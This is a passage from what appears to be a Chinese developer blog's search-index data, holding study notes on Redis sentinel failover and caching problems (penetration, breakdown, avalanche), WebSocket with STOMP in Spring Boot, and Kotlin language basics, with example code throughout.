mymaster 192.168.65.61 26380 52d0a5d70c1f90475b4fc03b6ce7c3c569 35760fsentinel known‐sentinel mymaster 192.168.65.61 26381 e9f530d3882f8043f76ebb8e1686438ba8 bd5ca6\n\nRedis主节点如果挂了，哨兵集群会重新选举出新的Redis主节点，同时会修改所有sentinel节点配置文件的集群元数据信息。比如主节点6379挂了，假设选举出的新主节点是6380，则sentinel文件里的集群元数据信息会变成如下所示：\nBash# 代表主节点的从节点信息sentinel known‐replica mymaster 192.168.65.61 6379sentinel known‐replica mymaster 192.168.65.61 6381# 其它哨兵节点sentinel known‐sentinel mymaster 192.168.65.61 26380 52d0a5d70c1f90475b4fc03b6ce7c3c569 35760fsentinel known‐sentinel mymaster 192.168.65.61 26381 e9f530d3882f8043f76ebb8e1686438ba8 bd5ca6\n\n同时还会修改sentinel文件里之前配置的mymaster对应的6379端口，改为6380：\nsentinel monitor mymaster 192.168.65.61 6380 2\n\n当端口号为6379的Redis实例再次启动时，哨兵集群根据集群元数据信息就可以将6379端口的Redis节点作为从节点加入集群。\n哨兵leader选举当一个master服务器被某sentinel视为下线状态后，该sentinel会与其他sentinel协商，选出sentinel中的leader进行故障转移工作。每个发现master下线的sentinel都可以要求其他sentinel选自己为leader，选举是先到先得。同时每个sentinel每次选举都会自选举周期，每个周期中只会选出一个leader。如果所有超过一半的sentinel选举某sentinel作为leader，那么就表示选举成功。之后该sentinel进行故障转移操作，从存活的slave中选举出新的master，这个选举过程跟集群的master选举很类似。\n如果哨兵集群只有一个sentinel，redis的主从也能正常运行以及选举master，如果master挂了，那唯一的那个sentinel就是leader了，可以正常选举新master。不过为了高可用一般都推荐至少部署三个sentinel。\n哨兵模式优缺点优点：\n1、哨兵集群，基于主从复制模式，所有的主从配置优点，它全有\n2、 主从可以切换，故障可以转移，系统的可用性就会更好\n3、哨兵模式就是主从模式的升级，手动到自动，更加健壮！\n缺点：\n1、Redis 不好啊在线扩容的，集群容量一旦到达上限，在线扩容就十分麻烦！\n2、实现哨兵模式的配置其实是很麻烦的，里面有很多选择！\n缓存穿透缓存穿透是指查询一个根本不存在的数据， 缓存层和存储层都不会命中， 通常出于容错的考虑， 如果从存储层查不到数据则不写入缓存层。\n用户想要查询一个数据，发现redis内存数据库没有，也就是缓存没有命中，于是向持久层数据库查询。发现也没有，于是本次查询失败。当用户很多的时候，缓存都没有命中（秒杀！），于是都去请求了持久层数据库。这会给持久层数据库造成很大的压力，这时候就相当于出现了缓存穿透。 \n\n缓存穿透将导致不存在的数据每次请求都要到存储层去查询， 失去了缓存保护后端存储的意义。 造成缓存穿透的基本原因有两个：自身业务代码或者数据出现问题或者一些恶意攻击、 爬虫等造成大量空命中。 主要有如下两种解决方案：\n\n缓存空对象\n\n当请求到来时，先去Redis缓存层中查询数据，如果没查询到，再到数据库中查。若从数据库中也没有查到，那么就将该key缓存到redis中并且value置为空，接着再设置一个过期时间，就可以有效防止缓存穿透。\n但是这种方法会存在两个问题：\n1、如果空值能够被缓存起来，这就意味着缓存需要更多的空间存储更多的键，因为这当中可能会有很多的空值的键；\n2、即使对空值设置了过期时间，还是会存在缓存层和存储层的数据会有一段时间窗口的不一致，这对于需要保持一致性的业务会有影响。\n\n布隆过滤器\n\n对于恶意攻击，向服务器请求大量不存在的数据造成的缓存穿透，可以通过布隆过滤器先做一次过滤，对于不存在的数据布隆过滤器一般都能够过滤掉，不让请求再往后端发送。布隆过滤器的特点是：计算出某个值存在时，这个值可能不存在；计算出某个值不存在时，那就肯定不存在。 Redisson客户端提供了布隆过滤器的功能：\npublic class RedissonBloomFilter &#123;    public static void main(String[] args) &#123;        Config config = new Config();        config.useSingleServer().setAddress(&quot;redis://192.168.65.61:6379&quot;);         RedissonClient redisson = Redisson.create(config);                 // 创建一个布隆过滤器，传入一个key的名称        RBloomFilter&lt;String&gt; bloomFilter = redisson.getBloomFilter(&quot;bloomfilter&quot;);        // 初始化布隆过滤器，两个参数：        // 1. 预计元素个数        // 2. 误差率为        // 根据这两个参数Redisson会计算出布隆过滤器所需要的的bit数组大小         bloomFilter.tryInit(100000000L,0.03);         // 向布隆过滤器中添加key        bloomFilter.add(&quot;liduoan&quot;);         // 判断key是否在布隆过滤器中        System.out.println(bloomFilter.contains(&quot;guojia&quot;));    &#125;&#125;\n\n创建完布隆过滤器后，需要将所有的key都添加到过滤器中。布隆过滤器占用的空间其实并不大，100亿个bit位也就是1G多的内存空间，但它的缺点是不能删除数据，如果要删除得重新初始化数据。\n缓存失效(击穿)类比打击一个点，打穿了直接打到数据库层。\n缓存击穿，是指一个key非常热点，在不停的扛着大并发，大并发集中对这一个点进行访问，当这个key在失效的瞬间，持续的大并发就穿破缓存，直接请求数据库，就像在一个屏障上凿开了一个洞。\n当某个key在过期的瞬间，有大量的请求并发访问，这类数据一般是热点数据，由于缓存过期，会同时访问数据库来查询最新数据，并且回写缓存，会导使数据库瞬间压力过大。\n解决方案：\n设置热点数据永不过期\n从缓存层面来看，没有设置过期时间，所以不会出现热点 key 过期后产生的问题。\n或者可以将过期时间相同的一批数据的过期时间设置为基础过期时间 + 随机数。\n加互斥锁\n分布式锁：使用分布式锁，保证对于每个key同时只有一个线程去查询后端服务，其他线程没有获得分布式锁的权限，因此只需要等待即可。这种方式将高并发的压力转移到了分布式锁，因此对分布式锁的考验很大。\n缓存雪崩缓存雪崩，是指在某一个时间段，缓存集中过期失效。Redis 宕机！\n\n产生雪崩的原因之一，比如在写本文的时候，马上就要到双十二零点，很快就会迎来一波抢购，这波商品时间比较集中的放入了缓存，假设缓存一个小时。那么到了凌晨一点钟的时候，这批商品的缓存就都过期了。而对这批商品的访问查询，都落到了数据库上，对于数据库而言，就会产生周期性的压力波峰。于是所有的请求都会达到存储层，存储层的调用量会暴增，造成存储层也会挂掉的情况。\n另一说法：\n\n缓存雪崩指的是缓存层支撑不住或宕掉后， 流量会像奔逃的野牛一样， 打向后端存储层。由于缓存层承载着大量请求， 有效地保护了存储层， 但是如果缓存层由于某些原因不能提供服务(比如超大并发过来，缓存层支撑不住，或者由于缓存设计不好，类似大量请求访问bigkey，导致缓存能支撑的并发急剧下降)， 于是大量请求都会打到存储层，存储层的调用量会暴增， 造成存储层也会级联宕机的情况。预防和解决缓存雪崩问题， 可以从以下三个方面进行着手：\n\n解决方法：\nredis高可用\n这个思想的含义是，既然redis有可能挂掉，那我多增设几台redis，这样一台挂掉之后其他的还可以继续\n工作，其实就是搭建的集群。（异地多活！）\n限流降级（在SpringCloud讲解过！）\n这个解决方案的思想是，在缓存失效后，通过加锁或者队列来控制读数据库写缓存的线程数量。比如对\n某个key只允许一个线程查询数据和写缓存，其他线程等待。\n数据预热\n数据加热的含义就是在正式部署之前，我先把可能的数据先预先访问一遍，这样部分可能大量访问的数\n据就会加载到缓存中。在即将发生大并发访问前手动触发加载缓存不同的key，设置不同的过期时间，让\n缓存失效的时间点尽量均匀。\n\n未完待续\n","tags":["2021"]},{"title":"webSocket","url":"/2021/03/10/2021/webSocket/","content":"\n\n前言由于面试被问到WebSocket，所以需要深入了解清楚\nwebSocket常用在消息通信方面，那么当我们需要服务端有新的消息时，如何通知客户端进行实时响应？\n可以使用的是消息队列和websocket\nWebSocket协议的特点\n建立在 TCP 协议之上，它需要通过握手连接之后才能通信，服务器端的实现比较容易。\n与 HTTP 协议有着良好的兼容性。默认端口也是80或443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。\n数据格式比较轻量，性能开销小，通信高效。可以发送文本，也可以发送二进制数据。\n没有同源限制，客户端可以与任意服务器通信。\n协议标识符是ws（如果加密，则为wss），服务器网址就是URL。（例如：ws:&#x2F;&#x2F;www.example.com/chat）\n它是一种双向通信协议，采用异步回调的方式接受消息，当建立通信连接，可以做到持久性的连接，WebSocket服务器和Browser都能主动的向对方发送或接收数据，实质的推送方式是服务器主动推送，只要有数据就推送到请求方。\n\nHTTP1.1与WebSocket的异同最后，作为总结，让我们再来回顾一下HTTP1.1与WebSocket的相同与不同。加深对WebSocket的理解。\n协议层面的异同相同点\n都是基于TCP的应用层协议。\n都使用Request&#x2F;Response模型进行连接的建立。\n在连接的建立过程中对错误的处理方式相同，在这个阶段WebSocket可能返回和HTTP相同的返回码。\n\n不同点\nHTTP协议基于Request&#x2F;Response，只能做单向传输，是半双工协议，而WebSocket是全双工协议，类似于Socket通信，双方都可以在任何时刻向另一方发送数据。\nWebSocket使用HTTP来建立连接，但是定义了一系列新的Header域，这些域在HTTP中并不会使用。换言之，二者的请求头不同。\nWebSocket的连接不能通过中间人来转发，它必须是一个直接连接。如果通过代理转发，一个代理要承受如此多的WebSocket连接不释放，就类似于一次DDOS攻击了。\nWebSocket在建立握手连接时，数据是通过HTTP协议传输的，但在建立连接之后，真正的数据传输阶段是不需要HTTP协议参与的。\nWebSocket传输的数据是二进制流，是以帧为单位的，HTTP传输的是明文传输，是字符串传输，WebSocket的数据帧有序。\n\n\nTip1都是为了保持住两者连接，但是http是保持在应用层方面，而websocket是保持在TCP方面，也就是传输层。\n省去了HTTP的大量的request和response的头部。节省了流量。\n\nWebSocket协议上并没有规定其消息发送的详细格式。那就意味着每个使用WebSocket的开发者，都需要自己在服务端和客户端定义一套规则，来传输信息。那么，有没有已经造好的轮子呢？答案肯定是有的。这就是STOMP。\nSTOMP(Simple Text Oriented Messaging Protocol)简介STOMP是一个用于C&#x2F;S之间进行异步消息传输的简单文本协议, 全称是Simple Text Oriented Messaging Protocol。\n\nSTOMP官方网站\n\n其实STOMP协议并不是为WS所设计的, 它其实是消息队列的一种协议, 和AMQP,JMS是平级的。 只不过由于它的简单性恰巧可以用于定义WS的消息体格式。 目前很多服务端消息队列都已经支持了STOMP, 比如RabbitMQ, Apache ActiveMQ等。很多语言也都有STOMP协议的客户端解析库，像JAVA的Gozirra，C的libstomp，Python的pyactivemq，JavaScript的stomp.js等等。\nSTOMP协议STOMP是一种基于帧的协议，一帧由一个命令，一组可选的Header和一个可选的Body组成。 STOMP是基于Text的，但也允许传输二进制数据。 它的默认编码是UTF-8，但它的消息体也支持其他编码方式，比如压缩编码。\nSTOMP服务端STOMP服务端被设计为客户端可以向其发送消息的一组目标地址。STOMP协议并没有规定目标地址的格式，它由使用协议的应用自己来定义。 例如&#x2F;topic&#x2F;a，&#x2F;queue&#x2F;a，queue-a对于STOMP协议来说都是正确的。应用可以自己规定不同的格式以此来表明不同格式代表的含义。比如应用自己可以定义以&#x2F;topic打头的为发布订阅模式，消息会被所有消费者客户端收到，以&#x2F;user开头的为点对点模式，只会被一个消费者客户端收到。\nSTOMP客户端对于STOMP协议来说, 客户端会扮演下列两种角色的任意一种：\n\n作为生产者，通过SEND帧发送消息到指定的地址\n作为消费者，通过发送SUBSCRIBE帧到已知地址来进行消息订阅，而当生产者发送消息到这个订阅地址后，订阅该地址的其他消费者会受到通过MESSAGE帧收到该消息\n\n实际上，WebSocket结合STOMP相当于构建了一个消息分发队列，客户端可以在上述两个角色间转换，订阅机制保证了一个客户端消息可以通过服务器广播到多个其他客户端，作为生产者，又可以通过服务器来发送点对点消息。\nSTOMP帧结构\nCOMMAND header1:value1 header2:value2\nBody^@\n\n^@表示行结束符\n一个STOMP帧由三部分组成:命令，Header(头信息)，Body（消息体）\n\n命令使用UTF-8编码格式，命令有SEND、SUBSCRIBE、MESSAGE、CONNECT、CONNECTED等。\nHeader也使用UTF-8编码格式，它类似HTTP的Header，有content-length,content-type等。\nBody可以是二进制也可以是文本。注意Body与Header间通过一个空行（EOL）来分隔。\n\n来看一个实际的帧例子：\n\nSEND destination:&#x2F;broker&#x2F;roomId&#x2F;1 content-length:57\n{“type”:”ENTER”,”content”:”o7jD64gNifq-wq-C13Q5CRisJx5E”}\n\n\n第1行：表明此帧为SEND帧，是COMMAND字段。\n第2行：Header字段，消息要发送的目的地址，是相对地址。\n第3行：Header字段，消息体字符长度。\n第4行：空行，间隔Header与Body。\n第5行：消息体，为自定义的JSON结构。\n\n更多STOMP协议的细节，如果大家感兴趣，可以参考上述的官方网页，有更多详细的帧结构介绍。下面，我们将主要介绍用Springboot和JS实现后端和前端，构建一个WebSocket的小型应用场景。\n\nspring中的WebSocket架构\n图中各个组件介绍：\n生产者型客户端（左上组件）: 发送SEND命令到某个目的地址(destination)的客户端。\n消费者型客户端（左下组件）: 订阅某个目的地址(destination), 并接收此目的地址所推送过来的消息的客户端。\nrequest channel: 一组用来接收生产者型客户端所推送过来的消息的线程池。\nresponse channel: 一组用来推送消息给消费者型客户端的线程池。\nbroker: 消息队列管理者，也可以成为消息代理。它有自己的地址（例如“&#x2F;topic”），客户端可以向其发送订阅指令，它会记录哪些订阅了这个目的地址(destination)。\n应用目的地址(图中的”&#x2F;app”): 发送到这类目的地址的消息在到达broker之前，会先路由到由应用写的某个方法。相当于对进入broker的消息进行一次拦截，目的是针对消息做一些业务处理。\n非应用目的地址(图中的”&#x2F;topic”，也是消息代理地址): 发送到这类目的地址的消息会直接转到broker。不会被应用拦截。\nSimpAnnotatonMethod: 发送到应用目的地址的消息在到达broker之前, 先路由到的方法. 这部分代码是由应用控制的。\n\n消息从生产者发出到消费者消费的流转流程首先，生产者通过发送一条SEND命令消息到某个目的地址(destination)，服务端request channel接受到这条SEND命令消息，如果目的地址是应用目的地址则转到相应的由应用自己写的业务方法做处理（对应图中的SimpAnnotationMethod），再转到broker(SimpleBroker)。如果目的地址是非应用目的地址则直接转到broker。broker通过SEND命令消息来构建MESSAGE命令消息, 再通过response channel推送MESSAGE命令消息到所有订阅此目的地址的消费者。 废话不多说，下面直接上代码。\n\n代码上主要配置一下broker和对相应方法进行书写\n对Controller进行处理\npackage com.xnpe.club.wbs.controller;import com.xnpe.club.wbs.data.Greeting;import com.xnpe.club.wbs.data.HelloMessage;import org.springframework.messaging.handler.annotation.MessageMapping;import org.springframework.messaging.handler.annotation.SendTo;import org.springframework.stereotype.Controller;import org.springframework.web.util.HtmlUtils;@Controller //使用Controller注解来标识这是一个控制器类public class GreetingController &#123;    @MessageMapping(&quot;/hello&quot;)     //使用MessageMapping注解来标识所有发送到“/hello”这个destination的消息，都会被路由到这个方法进行处理.    @SendTo(&quot;/topic/greetings&quot;)    //使用SendTo注解来标识这个方法返回的结果，都会被发送到它指定的destination，“/topic/greetings”.    //传入的参数HelloMessage为客户端发送过来的消息，是自动绑定的。    public Greeting greeting(HelloMessage message) throws Exception &#123;        Thread.sleep(1000); // 模拟处理延时        return new Greeting(&quot;Hello, &quot; + HtmlUtils.htmlEscape(message.getName()) + &quot;!&quot;);         //根据传入的信息，返回一个欢迎消息.    &#125;&#125;\n\n这里表示 有关的消息发送之后会先到这个Controller\n结束之后会到消息队列&#x2F;topic&#x2F;greetings\n为Spring配置STOMP消息刚才我们已经创建了消息处理控制器，也就是我们的业务处理逻辑。现在我们要为Spring配置WebSocket和STOMP消息设置。 创建一个名为WebSocketController的类：\n@Configuration //使用Configuration注解标识这是一个Springboot的配置类.@EnableWebSocketMessageBroker //使用此注解来标识使能WebSocket的broker.即使用broker来处理消息.public class WebSocketConfig implements WebSocketMessageBrokerConfigurer &#123;    @Override    //实现WebSocketMessageBrokerConfigurer中的此方法，配置消息代理（broker）    public void configureMessageBroker(MessageBrokerRegistry config) &#123;        config.enableSimpleBroker(&quot;/topic&quot;);         //启用SimpleBroker，使得订阅到此&quot;topic&quot;前缀的客户端可以收到greeting消息.        config.setApplicationDestinationPrefixes(&quot;/app&quot;);         //将&quot;app&quot;前缀绑定到MessageMapping注解指定的方法上。如&quot;app/hello&quot;被指定用greeting()方法来处理.    &#125;    @Override    //用来注册Endpoint，“/gs-guide-websocket”即为客户端尝试建立连接的地址。    public void registerStompEndpoints(StompEndpointRegistry registry) &#123;        registry.addEndpoint(&quot;/gs-guide-websocket&quot;).withSockJS();    &#125;&#125;\n\n配置主要包含两部分内容，一个是消息代理，另一个是Endpoint，消息代理指定了客户端订阅地址，以及发送消息的路由地址；Endpoint指定了客户端建立连接时的请求地址。\n至此，服务端的配置工作就完成了，非常简单。现在，让我们实现一个前端页面，来验证服务的工作情况。\n创建前端实现页面针对STOMP，前端我们采用JavaScript的stomp的客户端实现stomp.js以及WebSocket的实现SockJS。此处只展示核心代码。\n//使用SockJS和stomp.js来打开“gs-guide-websocket”地址的连接，这也是我们使用Spring构建的SockJS服务。function connect() &#123;    var socket = new SockJS(&#x27;/gs-guide-websocket&#x27;);    stompClient = Stomp.over(socket);    stompClient.connect(&#123;&#125;, function (frame) &#123;        //连接成功后的回调方法        setConnected(true);        console.log(&#x27;Connected: &#x27; + frame);        //订阅/topic/greetings地址，当服务端向此地址发送消息时，客户端即可收到。        stompClient.subscribe(&#x27;/topic/greetings&#x27;, function (greeting) &#123;            //收到消息时的回调方法，展示欢迎信息。            showGreeting(JSON.parse(greeting.body).content);        &#125;);    &#125;);&#125;//断开连接的方法function disconnect() &#123;    if (stompClient !== null) &#123;        stompClient.disconnect();    &#125;    setConnected(false);    console.log(&quot;Disconnected&quot;);&#125;//将用户输入的名字信息,使用STOMP客户端发送到“/app/hello”地址。它正是我们在GreetingController中定义的greeting()方法所处理的地址.function sendName() &#123;    stompClient.send(&quot;/app/hello&quot;, &#123;&#125;, JSON.stringify(&#123;&#x27;name&#x27;: $(&quot;#name&quot;).val()&#125;));&#125;\n\n\nTips这里只需要做好配置操作和对应的Controller进行处理就好了\n配置主要包含两部分内容，一个是消息代理，另一个是Endpoint\n消息代理说明了消息发送过来，需要在哪个位置处理\n同时说明处理完成需要放在哪个队列里面\n简易做法就是这样\n再来论述一遍WebSocket的相关知识\nWebSocket一般可以说明消费者、生产者、broker【消息队列管理者】\n地址可以简易分为两类，应用目的地址、非应用目的地址\n应用目的地址相当于进入broker之前会进行一个操作\n非应用目的地址会直接到达broker\n然后由broker进行处理，放到队列中去\nbroker:它有自己的地址（例如“&#x2F;topic”），客户端可以向其发送订阅指令，它会记录哪些订阅了这个目的地址(destination)。\n","tags":["2021"]},{"title":"kotlin","url":"/2022/02/16/2022/kotlin/","content":"Kotlin基础\n\n一种在Java虚拟机上运行的静态类型编程语言\n可以和java代码相互与运作\n容易在Android项目中替代Java或者同Java一起使用\n \n*kt会被Kotlin编译器编程编译成.class的字节码文件，然后被归档成.jar，最后呢由各平台打包工具输出最终的原因程序 \n上图不难理解*kt最终会被编译成Java的字节码文件，那为什么在最后一步还需要一个Kotlin运行时呢？\n这是因为，我们用Java来写的程序所有的实现都会有标准的Java类库来做支撑，比如：java.lang.*, java.util.*，但Kotlin中的类库是不在标准的Java类库中的，所以，Kotlin应用程序需要在最后一步借助Kotlin运行时来支撑这些Java标准类库没有的实现。\n数据类型Kotlin 的基本数值类型包括 Byte、Short、Int、Long、Float、Double 等。不同于 Java 的是，字符不属于数值类型，是一个独立的数据类型。\nfun baseType() &#123;    val num1 = -1.5  //默认的double类型    val num2 = 1f    //这里是float类型    var num3 = 3 //Int类型   &#125;\n\n数组数组的创建方式：\nfun arrayType() &#123;    // arrayOf 创建数组    var arrayOf = arrayOf(1, 2, 3)    // arrayOfNulls创建指定大小 所有元素为空的数组    var arrayOfNulls = arrayOfNulls&lt;String&gt;(5)    // 动态创建数组    var asc = Array(5) &#123;i -&gt; (i*i).toString()&#125;    asc.forEach &#123; println(it) &#125;    //[] 运算符代表调用成员方法 get() 与 set()    // 原生类型数组    var intArrayOf = intArrayOf(3, 4, 5)    // 大小为5 数值为0的数组    var intArray = IntArray(5)    // 大小为5 数值为32的数组    var intInit = IntArray(5) &#123; 32 &#125;&#125;\n\n数组的遍历方式：\nfun arrayFor() &#123;    var array = intArrayOf(3, 4, 5)    // 数组遍历    for (item in array) &#123;        println(item)    &#125;    // 索引遍历    for (index in array.indices) &#123;        println(index.toString() + &quot;-&gt; $&#123;array[index]&#125;&quot; )    &#125;    // 遍历元素带索引    for ((index, item) in array.withIndex()) &#123;        println(&quot;$index -&gt; $item&quot;)    &#125;    // foreach 遍历    array.forEach &#123; print(it) &#125;    //  高级foreach    array.forEachIndexed &#123; index, item -&gt;        println(&quot;$index -&gt; $item&quot;)    &#125;&#125;\n\n集合Kotlin 标准库提供了一整套用于管理集合的工具，集合是可变数量（可能为零）的一组条目，各种集合对于解决问题都具有重要意义，并且经常用到。\n\nList 是一个有序集合，可通过索引（反映元素位置的整数）访问元素。元素可以在 list 中出现多次。列表的一个示例是一句话：有一组字、这些字的顺序很重要并且字可以重复。 \n\nSet 是唯一元素的集合。它反映了集合（set）的数学抽象：一组无重复的对象。一般来说 set 中元素的顺序并不重要。例如，字母表是字母的集合（set）。 \n\nMap（或者字典）是一组键值对。键是唯一的，每个键都刚好映射到一个值，值可以重复。\n\n\n我们需要注意到，集合分为可变集合和不可变集合两种方式\n而数组则是可变的数组，我们可以看到Array中\npublic class Array&lt;T&gt; &#123;    public inline constructor(size: Int, init: (Int) -&gt; T)    public operator fun get(index: Int): T    public operator fun set(index: Int, value: T): Unit    public val size: Int    public operator fun iterator(): Iterator&lt;T&gt;&#125;\n\n这里我们看下集合的排序Api\nfun listMap() &#123;    val numbers = mutableListOf(1, 2, 3, 4)    //随机排列元素    numbers.shuffle()    println(numbers)    numbers.sort()    //排序，从小打到    numbers.sortDescending()    //从大到小    println(numbers)    //定义一个Person类，有name 和 age 两属性    data class Language(var name: String, var score: Int)    val languageList: MutableList&lt;Language&gt; = mutableListOf()    languageList.add(Language(&quot;Java&quot;, 80))    languageList.add(Language(&quot;Kotlin&quot;, 90))    languageList.add(Language(&quot;Dart&quot;, 99))    languageList.add(Language(&quot;C&quot;, 80))    //使用sortBy进行排序，适合单条件排序    languageList.sortBy &#123; it.score &#125;    println(languageList)    //使用sortWith进行排序，适合多条件排序    languageList.sortWith(compareBy(    //it变量是lambda中的隐式参数    &#123; it.score &#125;, &#123; it.name &#125;) )    println(languageList)&#125;\n\n方法\n在Java中对象是一等公民，而在Kotlin中方法是一等公民\n所有的方法是可以直接定义在文件里面的，而java中方法必须定义类中\n这也说明了Kotlin是以方法为一等的\n方法声明主要看下有哪些方法\n成员方法\nfun main() &#123;    Person().getName()&#125;class Person &#123;    fun getName() &#123;        println(this.javaClass.simpleName)    &#125;&#125;\n\n类方法\n也就是我们在java中常说的静态方法\n在kotlin中可以有几种方式实现\n\ncompanion object 实现的类方法\n\nfun main() &#123;    Person.fun2()&#125;class Person &#123;    // 伙伴对象的类方法    companion object &#123;        fun fun2() &#123;            println(&quot;伙伴对象的类方法&quot;)        &#125;    &#125;    fun getName() &#123;        println(this.javaClass.simpleName)    &#125;&#125;\n\n\n静态类\n\n// 工具类的类方法object TimeUtil &#123;    fun timeGet(): Date &#123;        return Date()    &#125;&#125;\n\n\n全局静态\n也就是Kotlin文件中定义的一些方法，它们可以在任何地方被调用\n\n\n单表达式方法\n也就是方法返回的是单个的表达式，可以省略花括号并且在=号后指定代码体\nfun double(x: Int): Int = x * 2// 返回值可以由编译器进行推断fun double(x: Int) = x * 2\n\n方法参数主要有具体参数，默认参数，可变数量的参数\n具体参数就是平常的那种\n默认参数指的是参数可以有默认值\n// 可以看到off的数值为0 len的数值为数组大小fun read(b: Array, off: Int = 0, len: Int = b.size) &#123; /*……*/ &#125;\n\n补充知识，在方法中最后一个参数是Lambda表达式的话，表达式可以在括号外传入。\n可变数量的参数(Varargs)\n方法的参数（通常是最后一个）可以用 vararg 修饰符标记：\nfun append(vararg str: Char): String &#123;\t//.....&#125;\n\n可变参数的要求： \n只有一个参数可以标注为 vararg； \n如果 vararg 参数不是列表中的最后一个参数， 可以使用具名参数语法传递其后的参数的值，或者，如果参数具有方法类型，则通过在括号外部传一个 Lambda。\n当我们调用 vararg 方法时，我们可以一个接一个地传参，例如 append(&#39;h&#39;, &#39;e&#39;, &#39;l&#39;, &#39;l&#39;, &#39;o&#39;)，或者，如果我们已经有一个数组并希望将其内容传给该方法，我们使用伸展（spread）操作符（在数组前面加 *）：\nval world = charArrayOf(&#x27;w&#x27;, &#x27;o&#x27;, &#x27;r&#x27;, &#x27;l&#x27;, &#x27;d&#x27;) val result = append(&#x27;h&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;,&#x27; &#x27;, *world)\n\n方法作用域方法作用域为文件顶层声明，局部方法\n我们主要看下没见过的局部方法\nfun magic(): Int&#123;    // 局部方法    fun foo(v:Int): Int &#123;        return v*v    &#125;    var random = (0..100).random()        return foo(random)&#125;\n\n方法进阶高阶方法高阶函数就是将函数作为参数或返回值的函数。Kotlin支持高阶函数，这是Kotlin函数式编程的一大特性。\n一般有函数作为参数和函数作为返回值两种方式\n作为参数比较简单\nfun List&lt;Int&gt;.sum(callback: (Int) -&gt; Unit): Int &#123;    var result = 0    for(v in this) &#123;        result += v        callback(v)    &#125;    return result&#125;//调用方式fun main() &#123;    var listOf = listOf&lt;Int&gt;(1, 2, 3)    var sum = listOf.sum &#123; println(it) &#125;&#125;\n\n作为返回值比较不好明白\n// 需求：实现一个能够对集合元素进行求和的高阶函数，并且返回一个 声明为(scale: Int) -&gt; Float的函数fun List&lt;String&gt;.toIntSum() : (scale: Int) -&gt; Float&#123;    println(&quot;第一层函数&quot;)    return fun(scale) : Float&#123;        var result = 0f        for (v in this) &#123;            result += v.toInt() * scale        &#125;        return result    &#125;&#125;// 调用方式fun main() &#123;    var listOf = listOf&lt;String&gt;(&quot;1&quot;, &quot;2&quot;, &quot;3&quot;)    var toIntSum = listOf.toIntSum()    println(toIntSum(2))    //简易写法可以为    // listOf.toIntSum()(2)&#125;\n\n闭包方法与闭包的特性可以说是Kotlin语言最大的特性了\n闭包可以简单理解为能够读取其他方法内部变量的方法。例如在JavaScript中，只有方法内部的子方法才能读取局部变量，所以闭包可以理解成“定义在一个方法内部的方法“。在本质上，闭包是将方法内部和方法外部连接起来的桥梁。\n闭包的特性：\n\n方法可以作为另一个方法的返回值或者参数，还可以作为一个变量的值\n方法可以嵌套定义，即在一个方法内部可以定义另一个方法\n\n闭包的好处：\n\n加强模块化：闭包有益于模块化编程，它能以简单的方式开发较小的模块，提高开发速度和程序的可复用性\n抽象：闭包是数据和行为的组合，这可以使得闭包具有较好的抽象能力\n灵活：闭包的应用使得编程更加灵活\n简化代码\n\n//需求：实现一个接受一个testClosure方法，该方法要接受一个Int类型的v1参数，// 同时能够返回一个声明为(v2: Int, (Int) -&gt; Unit)的函数，并且这个函数能够计算v1与v2的和fun testClosure(v1: Int): (v2: Int, (Int) -&gt; Unit) -&gt; Unit &#123;    println(&quot;第一层函数&quot;)    return fun(v2: Int, printer: (Int) -&gt; Unit) &#123;        printer(v1 + v2)    &#125;&#125;fun main() &#123;    var testClosure = testClosure(2)    testClosure(3)&#123;        println(it)    &#125;&#125;\n\n解构声明指的是把对象解构成很多的变量\nvar result = Result(&quot;success&quot;, 0) // 解构声明的语法val (msg, code) = result println(&quot;msg:$&#123;msg&#125;&quot;) println(&quot;code:$&#123;code&#125;&quot;)\n\n很清晰的语法方式\n匿名方法就是没有方法名的方法\n//这种就是匿名方法fun(x: Int, y: Int): Int = x + yfun(x: Int, y: Int): Int &#123;    return x + y &#125;\n\n我们在闭包的例子中返回的方法就是匿名方法\n这就是一个简易的语法罢了\n方法的字面值我认为这个就是变量可以是一个方法的官方解释\n//定义了一个变量 tmp，而该变量的类型就是 (Int) -&gt; Boolean fun literal() &#123; \tvar tmp: ((Int) -&gt; Boolean)? = null     // &#123; num -&gt; (num &gt; 10) &#125;即是一个方法字面值     tmp = &#123; num -&gt; (num &gt; 10) &#125;     println(tmp(10))&#125;\n\n看到tmp变量，他的变量类型是什么？是方法！\n类与接口构造方法在Kotlin中一个类可以有一个主构造方法和多个次构造方法\n我们先看主构造方法\n主构造方法是类头的一部分，跟在类名后面。\nclass KotlinClass constructor(name: String) &#123;&#125;\n\n\n如果主构造方法没有任何注解或者可见性修饰符可以省去constructor\n\nclass KotlinClass (name: String) &#123;&#125;\n\n\n主构造方法不能包含任何代码，初始化代码可以放到init关键字的初始化块中。\n初始化块的顺序按照在类体中的顺序执行，和属于初始化器交织在一起\n\n声明属性的构造方法\n//构造方法的参数作为类的属性并赋值，//KotlinClass2在初始化时它的name与score属性会被赋值 class KotlinClass2(val name: String, var score: Int) &#123; /*……*/ &#125;\n\n次构造方法\n我们可以在类体内通过constructor声明类的次构造方法\nclass KotlinClass constructor(name: String) &#123;        var views: MutableList&lt;View&gt; = mutableListOf()    constructor(view: View, name: String) : this(name) &#123;        views.add(view)    &#125;&#125;\n\n类有主构方法的时候，每个次构造方法都要委托给主构造方法处理\n初始化代码块中的代码是主构造方法的一部分，所以初始化代码会在次构造方法执行前执行【init代码块】\n继承与覆盖和Java不同，Kotlin中所有类都默认为final，如果他需要被继承，我们需要使用open声明\n// 打开继承open class Animal(age:Int) &#123;    init &#123;        println(age)    &#125;&#125;\n\n\n在Kotlin中所有类都有共同的超类Any，Any有三个方法equals(),hashCode(),toString()\n\n在Kotlin中继承用:如需继承一个类，请在类头中把超类放到冒号之后：\n//派生类有柱构造方法的情况 class Dog(age: Int) : Animal(age)\n\n 如果派生类有一个主构造方法，其基类必须用派生类主构造方法的参数初始化。 \n如果派生类没有主构造方法，那么每个次构造方法必须使用 super 关键字初始化其基类型。\n//派生类无柱构造方法的情况 class Cat : Animal &#123;     constructor(age: Int) : super(age) &#125;\n\n覆盖规则\n主要是两种，覆盖方法和覆盖属性\n// 打开继承open class Animal(age:Int) &#123;    // 属性允许被覆盖    open val foot = 0    init &#123;        println(age)    &#125;    open fun eat() &#123;    &#125;&#125;// 继承class Dog(age: Int) : Animal(age) &#123;    //覆盖属性    override val foot = 4    // 覆盖方法    override fun eat() &#123;    